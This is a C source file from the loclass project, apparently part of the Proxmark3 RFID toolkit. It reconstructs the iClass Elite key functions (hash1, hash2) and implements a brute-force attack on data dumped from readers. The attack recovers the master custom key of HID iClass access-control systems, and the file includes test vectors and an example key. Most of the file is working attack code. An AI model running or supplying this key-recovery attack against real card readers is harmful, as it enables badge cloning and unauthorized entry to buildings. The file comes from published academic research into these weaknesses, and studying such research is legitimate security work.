/*****************************************************************************
 * WARNING
 *
 * THIS CODE IS CREATED FOR EXPERIMENTATION AND EDUCATIONAL USE ONLY.
 *
 * USAGE OF THIS CODE IN OTHER WAYS MAY INFRINGE UPON THE INTELLECTUAL
 * PROPERTY OF OTHER PARTIES, SUCH AS INSIDE SECURE AND HID GLOBAL,
 * AND MAY EXPOSE YOU TO AN INFRINGEMENT ACTION FROM THOSE PARTIES.
 *
 * THIS CODE SHOULD NEVER BE USED TO INFRINGE PATENTS OR INTELLECTUAL PROPERTY RIGHTS.
 *
 *****************************************************************************
 *
 * This file is part of loclass. It is a reconstructon of the cipher engine
 * used in iClass, and RFID techology.
 *
 * The implementation is based on the work performed by
 * Flavio D. Garcia, Gerhard de Koning Gans, Roel Verdult and
 * Milosch Meriac in the paper "Dismantling IClass".
 *
 * Copyright (C) 2014 Martin Holst Swende
 *
 * This is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as published
 * by the Free Software Foundation, or, at your option, any later version.
 *
 * This file is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with loclass.  If not, see <http://www.gnu.org/licenses/>.
 *
 *
 *
 ****************************************************************************/
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include "cipherutils.h"
#include "cipher.h"
#include "ikeys.h"
#include "elite_crack.h"
#include "fileutils.h"
#include "mbedtls/des.h"
#include "util_posix.h"

/**
 * @brief Permutes a key from standard NIST format to Iclass specific format
 *  from http://www.proxmark.org/forum/viewtopic.php?pid=11220#p11220
 *
 *  If you permute [6c 8d 44 f9 2a 2d 01 bf]  you get  [8a 0d b9 88 bb a7 90 ea]  as shown below.
 *
 *  1 0 1 1 1 1 1 1  bf
 *  0 0 0 0 0 0 0 1  01
 *  0 0 1 0 1 1 0 1  2d
 *  0 0 1 0 1 0 1 0  2a
 *  1 1 1 1 1 0 0 1  f9
 *  0 1 0 0 0 1 0 0  44
 *  1 0 0 0 1 1 0 1  8d
 *  0 1 1 0 1 1 0 0  6c
 *
 *  8 0 b 8 b a 9 e
 *  a d 9 8 b 7 0 a
 *
 * @param key
 * @param dest
 */
void permutekey(uint8_t key[8], uint8_t dest[8]) {
    int i;
    for (i = 0 ; i < 8 ; i++) {
        dest[i] = (((key[7] & (0x80 >> i)) >> (7 - i)) << 7) |
                  (((key[6] & (0x80 >> i)) >> (7 - i)) << 6) |
                  (((key[5] & (0x80 >> i)) >> (7 - i)) << 5) |
                  (((key[4] & (0x80 >> i)) >> (7 - i)) << 4) |
                  (((key[3] & (0x80 >> i)) >> (7 - i)) << 3) |
                  (((key[2] & (0x80 >> i)) >> (7 - i)) << 2) |
                  (((key[1] & (0x80 >> i)) >> (7 - i)) << 1) |
                  (((key[0] & (0x80 >> i)) >> (7 - i)) << 0);
    }
}
/**
 * Permutes  a key from iclass specific format to NIST format
 * @brief permutekey_rev
 * @param key
 * @param dest
 */
void permutekey_rev(uint8_t key[8], uint8_t dest[8]) {
    int i;
    for (i = 0 ; i < 8 ; i++) {
        dest[7 - i] = (((key[0] & (0x80 >> i)) >> (7 - i)) << 7) |
                      (((key[1] & (0x80 >> i)) >> (7 - i)) << 6) |
                      (((key[2] & (0x80 >> i)) >> (7 - i)) << 5) |
                      (((key[3] & (0x80 >> i)) >> (7 - i)) << 4) |
                      (((key[4] & (0x80 >> i)) >> (7 - i)) << 3) |
                      (((key[5] & (0x80 >> i)) >> (7 - i)) << 2) |
                      (((key[6] & (0x80 >> i)) >> (7 - i)) << 1) |
                      (((key[7] & (0x80 >> i)) >> (7 - i)) << 0);
    }
}

/**
 * Helper function for hash1
 * @brief rr
 * @param val
 * @return
 */
inline uint8_t rr(uint8_t val) {
    return val >> 1 | ((val & 1) << 7);
}

/**
 * Helper function for hash1
 * @brief rl
 * @param val
 * @return
 */
inline uint8_t rl(uint8_t val) {
    return val << 1 | ((val & 0x80) >> 7);
}

/**
 * Helper function for hash1
 * @brief swap
 * @param val
 * @return
 */
inline uint8_t swap(uint8_t val) {
    return ((val >> 4) & 0xFF) | ((val & 0xFF) << 4);
}

/**
 * Hash1 takes CSN as input, and determines what bytes in the keytable will be used
 * when constructing the K_sel.
 * @param csn the CSN used
 * @param k output
 */
void hash1(uint8_t csn[], uint8_t k[]) {
    k[0] = csn[0] ^ csn[1] ^ csn[2] ^ csn[3] ^ csn[4] ^ csn[5] ^ csn[6] ^ csn[7];
    k[1] = csn[0] + csn[1] + csn[2] + csn[3] + csn[4] + csn[5] + csn[6] + csn[7];
    k[2] = rr(swap(csn[2] + k[1]));
    k[3] = rl(swap(csn[3] + k[0]));
    k[4] = ~rr(csn[4] + k[2]) + 1;
    k[5] = ~rl(csn[5] + k[3]) + 1;
    k[6] = rr(csn[6] + (k[4] ^ 0x3c));
    k[7] = rl(csn[7] + (k[5] ^ 0xc3));

    k[7] &= 0x7F;
    k[6] &= 0x7F;
    k[5] &= 0x7F;
    k[4] &= 0x7F;
    k[3] &= 0x7F;
    k[2] &= 0x7F;
    k[1] &= 0x7F;
    k[0] &= 0x7F;
}
/**
Definition 14. Define the rotate key function rk : (F 82 ) 8 × N → (F 82 ) 8 as
rk(x [0] . . . x [7] , 0) = x [0] . . . x [7]
rk(x [0] . . . x [7] , n + 1) = rk(rl(x [0] ) . . . rl(x [7] ), n)
**/
static void rk(uint8_t *key, uint8_t n, uint8_t *outp_key) {
    memcpy(outp_key, key, 8);
    uint8_t j;
    while (n-- > 0) {
        for (j = 0; j < 8 ; j++)
            outp_key[j] = rl(outp_key[j]);
    }
    return;
}

static mbedtls_des_context ctx_enc;
static mbedtls_des_context ctx_dec;

static void desdecrypt_iclass(uint8_t *iclass_key, uint8_t *input, uint8_t *output) {
    uint8_t key_std_format[8] = {0};
    permutekey_rev(iclass_key, key_std_format);
    mbedtls_des_setkey_dec(&ctx_dec, key_std_format);
    mbedtls_des_crypt_ecb(&ctx_dec, input, output);
}

static void desencrypt_iclass(uint8_t *iclass_key, uint8_t *input, uint8_t *output) {
    uint8_t key_std_format[8] = {0};
    permutekey_rev(iclass_key, key_std_format);
    mbedtls_des_setkey_enc(&ctx_enc, key_std_format);
    mbedtls_des_crypt_ecb(&ctx_enc, input, output);
}

/**
 * @brief Insert uint8_t[8] custom master key to calculate hash2 and return key_select.
 * @param key unpermuted custom key
 * @param hash1 hash1
 * @param key_sel output key_sel=h[hash1[i]]
 */
void hash2(uint8_t *key64, uint8_t *outp_keytable) {
    /**
     *Expected:
     * High Security Key Table

    00  F1 35 59 A1 0D 5A 26 7F 18 60 0B 96 8A C0 25 C1
    10  BF A1 3B B0 FF 85 28 75 F2 1F C6 8F 0E 74 8F 21
    20  14 7A 55 16 C8 A9 7D B3 13 0C 5D C9 31 8D A9 B2
    30  A3 56 83 0F 55 7E DE 45 71 21 D2 6D C1 57 1C 9C
    40  78 2F 64 51 42 7B 64 30 FA 26 51 76 D3 E0 FB B6
    50  31 9F BF 2F 7E 4F 94 B4 BD 4F 75 91 E3 1B EB 42
    60  3F 88 6F B8 6C 2C 93 0D 69 2C D5 20 3C C1 61 95
    70  43 08 A0 2F FE B3 26 D7 98 0B 34 7B 47 70 A0 AB

    **** The 64-bit HS Custom Key Value = 5B7C62C491C11B39 ******/
    uint8_t key64_negated[8] = {0};
    uint8_t z[8][8] = {{0}, {0}};
    uint8_t temp_output[8] = {0};
    //calculate complement of key
    int i;
    for (i = 0; i < 8; i++)
        key64_negated[i] = ~key64[i];

    // Once again, key is on iclass-format
    desencrypt_iclass(key64, key64_negated, z[0]);

//    PrintAndLogDevice(NORMAL, "\n"); PrintAndLogDevice(NORMAL, "High security custom key (Kcus):");
//    printvar("z0  ",  z[0],8);

    uint8_t y[8][8] = {{0}, {0}};

    // y[0]=DES_dec(z[0],~key)
    // Once again, key is on iclass-format
    desdecrypt_iclass(z[0], key64_negated, y[0]);
//    printvar("y0  ",  y[0],8);

    for (i = 1; i < 8; i++) {
        // z [i] = DES dec (rk(K cus , i), z [i−1] )
        rk(key64, i, temp_output);
        //y [i] = DES enc (rk(K cus , i), y [i−1] )

        desdecrypt_iclass(temp_output, z[i - 1], z[i]);
        desencrypt_iclass(temp_output, y[i - 1], y[i]);
    }

    if (outp_keytable != NULL) {
        for (i = 0 ; i < 8 ; i++) {
            memcpy(outp_keytable + i * 16, y[i], 8);
            memcpy(outp_keytable + 8 + i * 16, z[i], 8);
        }
    } else {
        printarr_human_readable("hash2", outp_keytable, 128);
    }
}

/**
 * @brief Reads data from the iclass-reader-attack dump file.
 * @param dump, data from a iclass reader attack dump.  The format of the dumpdata is expected to be as follows:
 *    <8 byte CSN><8 byte CC><4 byte NR><4 byte MAC><8 byte HASH1><1 byte NUM_BYTES_TO_RECOVER><3 bytes BYTES_TO_RECOVER>
 *    .. N times...
 *
 *  So the first attack, with 3 bytes to recover would be : ... 03000145
 *  And a later attack, with 1 byte to recover (byte 0x5)would be : ...01050000
 *  And an attack, with 2 bytes to recover (byte 0x5 and byte 0x07 )would be : ...02050700
 *
 * @param cc_nr an array to store cc_nr into (12 bytes)
 * @param csn an arracy ot store CSN into (8 bytes)
 * @param received_mac an array to store MAC into (4 bytes)
 * @param i the number to read. Should be less than 127, or something is wrong...
 * @return
 */
/*
static int _readFromDump(uint8_t dump[], dumpdata *item, uint8_t i) {
    size_t itemsize = sizeof(dumpdata);
    memcpy(item, dump + i * itemsize, itemsize);

    if (true) {
        printvar("csn", item->csn, sizeof(item->csn));
        printvar("cc_nr", item->cc_nr, sizeof(item->cc_nr));
        printvar("mac", item->mac, sizeof(item->mac));
    }
    return 0;
}
*/
//static uint32_t startvalue = 0;
/**
 * @brief Performs brute force attack against a dump-data item, containing csn, cc_nr and mac.
 *This method calculates the hash1 for the CSN, and determines what bytes need to be bruteforced
 *on the fly. If it finds that more than three bytes need to be bruteforced, it aborts.
 *It updates the keytable with the findings, also using the upper half of the 16-bit ints
 *to signal if the particular byte has been cracked or not.
 *
 * @param dump The dumpdata from iclass reader attack.
 * @param keytable where to write found values.
 * @return
 */
int bruteforceItem(dumpdata item, uint16_t keytable[]) {
    int errors = 0;
    int found = false;
    uint8_t key_sel_p[8] = {0};
    uint8_t div_key[8] = {0};
    uint8_t key_sel[8] = {0};
    uint8_t calculated_MAC[4] = {0};

    //Get the key index (hash1)
    uint8_t key_index[8] = {0};
    hash1(item.csn, key_index);

    /*
     * Determine which bytes to retrieve. A hash is typically
     * 01010000454501
     * We go through that hash, and in the corresponding keytable, we put markers
     * on what state that particular index is:
     * - CRACKED (this has already been cracked)
     * - BEING_CRACKED (this is being bruteforced now)
     * - CRACK_FAILED (self-explaining...)
     *
     * The markers are placed in the high area of the 16 bit key-table.
     * Only the lower eight bits correspond to the (hopefully cracked) key-value.
     **/
    uint8_t bytes_to_recover[3] = {0};
    uint8_t numbytes_to_recover = 0 ;
    int i;
    for (i = 0; i < 8; i++) {
        if (keytable[key_index[i]] & (CRACKED | BEING_CRACKED)) continue;

        bytes_to_recover[numbytes_to_recover++] = key_index[i];
        keytable[key_index[i]] |= BEING_CRACKED;

        if (numbytes_to_recover > 3) {
            PrintAndLogDevice(FAILED, "The CSN requires > 3 byte bruteforce, not supported");
            printvar("[-] CSN", item.csn, 8);
            printvar("[-] HASH1", key_index, 8);
            PrintAndLogDevice(NORMAL, "");
            //Before we exit, reset the 'BEING_CRACKED' to zero
            keytable[bytes_to_recover[0]]  &= ~BEING_CRACKED;
            keytable[bytes_to_recover[1]]  &= ~BEING_CRACKED;
            keytable[bytes_to_recover[2]]  &= ~BEING_CRACKED;
            return 1;
        }
    }

    /*
     *A uint32 has room for 4 bytes, we'll only need 24 of those bits to bruteforce up to three bytes,
     */
    //uint32_t brute = startvalue;
    uint32_t brute = 0;
    /*
       Determine where to stop the bruteforce. A 1-byte attack stops after 256 tries,
       (when brute reaches 0x100). And so on...
       bytes_to_recover = 1 --> endmask = 0x000000100
       bytes_to_recover = 2 --> endmask = 0x000010000
       bytes_to_recover = 3 --> endmask = 0x001000000
    */

    uint32_t endmask =  1 << 8 * numbytes_to_recover;
    PrintAndLogDevice(NORMAL, "----------------------------");
    for (i = 0 ; i < numbytes_to_recover && numbytes_to_recover > 1; i++)
        PrintAndLogDevice(INFO, "Bruteforcing byte %d", bytes_to_recover[i]);

    while (!found && !(brute & endmask)) {

        //Update the keytable with the brute-values
        for (i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]] &= 0xFF00;
            keytable[bytes_to_recover[i]] |= (brute >> (i * 8) & 0xFF);
        }

        // Piece together the key
        key_sel[0] = keytable[key_index[0]] & 0xFF;
        key_sel[1] = keytable[key_index[1]] & 0xFF;
        key_sel[2] = keytable[key_index[2]] & 0xFF;
        key_sel[3] = keytable[key_index[3]] & 0xFF;
        key_sel[4] = keytable[key_index[4]] & 0xFF;
        key_sel[5] = keytable[key_index[5]] & 0xFF;
        key_sel[6] = keytable[key_index[6]] & 0xFF;
        key_sel[7] = keytable[key_index[7]] & 0xFF;

        //Permute from iclass format to standard format
        permutekey_rev(key_sel, key_sel_p);
        //Diversify
        diversifyKey(item.csn, key_sel_p, div_key);
        //Calc mac
        doMAC(item.cc_nr, div_key, calculated_MAC);

        // success
        if (memcmp(calculated_MAC, item.mac, 4) == 0) {
            printf("\r\n");
            for (i = 0 ; i < numbytes_to_recover; i++) {
                PrintAndLogDevice(INFO, "%d: 0x%02x", bytes_to_recover[i], 0xFF & keytable[bytes_to_recover[i]]);
            }
            found = true;
            break;
        }

        brute++;
        if ((brute & 0xFFFF) == 0) {
            printf("%3d,", (brute >> 16) & 0xFF);
            if (((brute >> 16) % 0x10) == 0)
                printf("\n");
            fflush(stdout);
        }
    }

    if (!found) {
        PrintAndLogDevice(NORMAL, "\n");
        PrintAndLogDevice(WARNING, "Failed to recover %d bytes using the following CSN", numbytes_to_recover);
        printvar("[!] CSN", item.csn, 8);
        errors++;

        //Before we exit, reset the 'BEING_CRACKED' to zero
        for (i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]]  &= 0xFF;
            keytable[bytes_to_recover[i]]  |= CRACK_FAILED;
        }
    } else {
        //PrintAndLogDevice(SUCCESS, "DES calcs: %u", brute);
        for (i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]]  &= 0xFF;
            keytable[bytes_to_recover[i]]  |= CRACKED;
        }
    }
    return errors;
}

/**
 * From dismantling iclass-paper:
 *  Assume that an adversary somehow learns the first 16 bytes of hash2(K_cus ), i.e., y [0] and z [0] .
 *  Then he can simply recover the master custom key K_cus by computing
 *  K_cus = ~DES(z[0] , y[0] ) .
 *
 *  Furthermore, the adversary is able to verify that he has the correct K cus by
 *  checking whether z [0] = DES enc (K_cus , ~K_cus ).
 * @param keytable an array (128 bytes) of hash2(kcus)
 * @param master_key where to put the master key
 * @return 0 for ok, 1 for failz
 */
int calculateMasterKey(uint8_t first16bytes[], uint64_t master_key[]) {
    mbedtls_des_context ctx_e;

    uint8_t z_0[8] = {0};
    uint8_t y_0[8] = {0};
    uint8_t z_0_rev[8] = {0};
    uint8_t key64[8] = {0};
    uint8_t key64_negated[8] = {0};
    uint8_t result[8] = {0};

    // y_0 and z_0 are the first 16 bytes of the keytable
    memcpy(y_0, first16bytes, 8);
    memcpy(z_0, first16bytes + 8, 8);

    // Our DES-implementation uses the standard NIST
    // format for keys, thus must translate from iclass
    // format to NIST-format
    permutekey_rev(z_0, z_0_rev);

    // ~K_cus = DESenc(z[0], y[0])
    mbedtls_des_setkey_enc(&ctx_e, z_0_rev);
    mbedtls_des_crypt_ecb(&ctx_e, y_0, key64_negated);

    int i;
    for (i = 0; i < 8 ; i++)
        key64[i] = ~key64_negated[i];

    // Can we verify that the  key is correct?
    // Once again, key is on iclass-format
    uint8_t key64_stdformat[8] = {0};
    permutekey_rev(key64, key64_stdformat);

    mbedtls_des_setkey_enc(&ctx_e, key64_stdformat);
    mbedtls_des_crypt_ecb(&ctx_e, key64_negated, result);
    PrintAndLogDevice(NORMAL, "\n");
    PrintAndLogDevice(SUCCESS, "-- High security custom key (Kcus) --");
    printvar("[+] Standard format   ", key64_stdformat, 8);
    printvar("[+] iClass format     ", key64, 8);

    if (master_key != NULL)
        memcpy(master_key, key64, 8);

    if (memcmp(z_0, result, 4) != 0) {
        PrintAndLogDevice(WARNING, "Failed to verify calculated master key (k_cus)! Something is wrong.");
        return 1;
    } else {
        PrintAndLogDevice(NORMAL, "\n");
        PrintAndLogDevice(SUCCESS, "Key verified ok!\n");
    }
    return 0;
}
/**
 * @brief Same as bruteforcefile, but uses a an array of dumpdata instead
 * @param dump
 * @param dumpsize
 * @param keytable
 * @return
 */
int bruteforceDump(uint8_t dump[], size_t dumpsize, uint16_t keytable[]) {
    uint8_t i;
    int errors = 0;
    size_t itemsize = sizeof(dumpdata);

    uint64_t t1 = msclock();

    dumpdata *attack = (dumpdata *) calloc(itemsize, sizeof(uint8_t));

    for (i = 0 ; i * itemsize < dumpsize ; i++) {
        memcpy(attack, dump + i * itemsize, itemsize);
        errors += bruteforceItem(*attack, keytable);
    }
    free(attack);
    t1 = msclock() - t1;
    PrintAndLogDevice(SUCCESS, "time: %" PRIu64 " seconds", t1 / 1000);

    // Pick out the first 16 bytes of the keytable.
    // The keytable is now in 16-bit ints, where the upper 8 bits
    // indicate crack-status. Those must be discarded for the
    // master key calculation
    uint8_t first16bytes[16] = {0};

    for (i = 0 ; i < 16 ; i++) {
        first16bytes[i] = keytable[i] & 0xFF;

        if (!(keytable[i] & CRACKED))
            PrintAndLogDevice(WARNING, "error, we are missing byte %d, custom key calculation will fail...", i);
    }
    errors += calculateMasterKey(first16bytes, NULL);
    return errors;
}
/**
 * Perform a bruteforce against a file which has been saved by pm3
 *
 * @brief bruteforceFile
 * @param filename
 * @return
 */
int bruteforceFile(const char *filename, uint16_t keytable[]) {
    FILE *f = fopen(filename, "rb");
    if (!f) {
        PrintAndLogDevice(WARNING, "Failed to read from file '%s'", filename);
        return 1;
    }

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fsize <= 0) {
        PrintAndLogDevice(WARNING, "Error, when getting filesize");
        fclose(f);
        return 1;
    }

    uint8_t *dump = calloc(fsize, sizeof(uint8_t));
    if (!dump) {
        PrintAndLogDevice(WARNING, "Failed to allocate memory");
        fclose(f);
        return 2;
    }
    size_t bytes_read = fread(dump, 1, fsize, f);

    fclose(f);

    if (bytes_read < fsize) {
        PrintAndLogDevice(WARNING, "Error, could only read %d bytes (should be %d)", bytes_read, fsize);
    }

    uint8_t res = bruteforceDump(dump, fsize, keytable);
    free(dump);
    return res;
}
/**
 *
 * @brief Same as above, if you don't care about the returned keytable (results only printed on screen)
 * @param filename
 * @return
 */
int bruteforceFileNoKeys(const char *filename) {
    uint16_t keytable[128] = {0};
    return bruteforceFile(filename, keytable);
}

// ---------------------------------------------------------------------------------
// ALL CODE BELOW THIS LINE IS PURELY TESTING
// ---------------------------------------------------------------------------------
// ----------------------------------------------------------------------------
// TEST CODE BELOW
// ----------------------------------------------------------------------------
static int _testBruteforce() {
    int errors = 0;
    if (true) {
        // First test
        PrintAndLogDevice(INFO, "Testing crack from dumpfile...");

        /**
          Expected values for the dumpfile:
            High Security Key Table

            00  F1 35 59 A1 0D 5A 26 7F 18 60 0B 96 8A C0 25 C1
            10  BF A1 3B B0 FF 85 28 75 F2 1F C6 8F 0E 74 8F 21
            20  14 7A 55 16 C8 A9 7D B3 13 0C 5D C9 31 8D A9 B2
            30  A3 56 83 0F 55 7E DE 45 71 21 D2 6D C1 57 1C 9C
            40  78 2F 64 51 42 7B 64 30 FA 26 51 76 D3 E0 FB B6
            50  31 9F BF 2F 7E 4F 94 B4 BD 4F 75 91 E3 1B EB 42
            60  3F 88 6F B8 6C 2C 93 0D 69 2C D5 20 3C C1 61 95
            70  43 08 A0 2F FE B3 26 D7 98 0B 34 7B 47 70 A0 AB

            **** The 64-bit HS Custom Key Value = 5B7C62C491C11B39 ****
        **/
        uint16_t keytable[128] = {0};

        //Test a few variants
        if (fileExists("iclass_dump.bin")) {
            errors |= bruteforceFile("iclass_dump.bin", keytable);
        } else if (fileExists("loclass/iclass_dump.bin")) {
            errors |= bruteforceFile("loclass/iclass_dump.bin", keytable);
        } else if (fileExists("client/loclass/iclass_dump.bin")) {
            errors |= bruteforceFile("client/loclass/iclass_dump.bin", keytable);
        } else {
            PrintAndLogDevice(WARNING, "Error: The file iclass_dump.bin was not found!");
        }
    }
    return errors;
}

static int _test_iclass_key_permutation() {
    uint8_t testcase[8] = {0x6c, 0x8d, 0x44, 0xf9, 0x2a, 0x2d, 0x01, 0xbf};
    uint8_t testcase_output[8] = {0};
    uint8_t testcase_output_correct[8] = {0x8a, 0x0d, 0xb9, 0x88, 0xbb, 0xa7, 0x90, 0xea};
    uint8_t testcase_output_rev[8] = {0};
    permutekey(testcase, testcase_output);
    permutekey_rev(testcase_output, testcase_output_rev);

    if (memcmp(testcase_output, testcase_output_correct, 8) != 0) {
        PrintAndLogDevice(WARNING, "Error with iclass key permute!");
        printarr("testcase_output", testcase_output, 8);
        printarr("testcase_output_correct", testcase_output_correct, 8);
        return 1;

    }
    if (memcmp(testcase, testcase_output_rev, 8) != 0) {
        PrintAndLogDevice(WARNING, "Error with reverse iclass key permute");
        printarr("testcase", testcase, 8);
        printarr("testcase_output_rev", testcase_output_rev, 8);
        return 1;
    }

    PrintAndLogDevice(SUCCESS, "Iclass key permutation OK!");
    return 0;
}

static int _testHash1() {
    uint8_t expected[8] = {0x7E, 0x72, 0x2F, 0x40, 0x2D, 0x02, 0x51, 0x42};
    uint8_t csn[8] = {0x01, 0x02, 0x03, 0x04, 0xF7, 0xFF, 0x12, 0xE0};
    uint8_t k[8] = {0};
    hash1(csn, k);

    if (memcmp(k, expected, 8) != 0) {
        PrintAndLogDevice(WARNING, "Error with hash1!");
        printarr("calculated", k, 8);
        printarr("expected", expected, 8);
        return 1;
    }
    return 0;
}

int testElite() {
    PrintAndLogDevice(INFO, "Testing iClass Elite functinality...");
    PrintAndLogDevice(INFO, "Testing hash2");
    uint8_t k_cus[8] = {0x5B, 0x7C, 0x62, 0xC4, 0x91, 0xC1, 0x1B, 0x39};

    /**
     *Expected:
     * High Security Key Table

    00  F1 35 59 A1 0D 5A 26 7F 18 60 0B 96 8A C0 25 C1
    10  BF A1 3B B0 FF 85 28 75 F2 1F C6 8F 0E 74 8F 21
    20  14 7A 55 16 C8 A9 7D B3 13 0C 5D C9 31 8D A9 B2
    30  A3 56 83 0F 55 7E DE 45 71 21 D2 6D C1 57 1C 9C
    40  78 2F 64 51 42 7B 64 30 FA 26 51 76 D3 E0 FB B6
    50  31 9F BF 2F 7E 4F 94 B4 BD 4F 75 91 E3 1B EB 42
    60  3F 88 6F B8 6C 2C 93 0D 69 2C D5 20 3C C1 61 95
    70  43 08 A0 2F FE B3 26 D7 98 0B 34 7B 47 70 A0 AB

    **** The 64-bit HS Custom Key Value = 5B7C62C491C11B39 ****
     */
    uint8_t keytable[128] = {0};
    hash2(k_cus, keytable);
    printarr_human_readable("Hash2", keytable, 128);
    if (keytable[3] == 0xA1 && keytable[0x30] == 0xA3 && keytable[0x6F] == 0x95) {
        PrintAndLogDevice(SUCCESS, "Hash2 looks fine...");
    }

    int errors = 0 ;
    PrintAndLogDevice(INFO, "Testing hash1...");
    errors += _testHash1();
    PrintAndLogDevice(INFO, "Testing key diversification ...");
    errors += _test_iclass_key_permutation();
    errors += _testBruteforce();
    return errors;
}
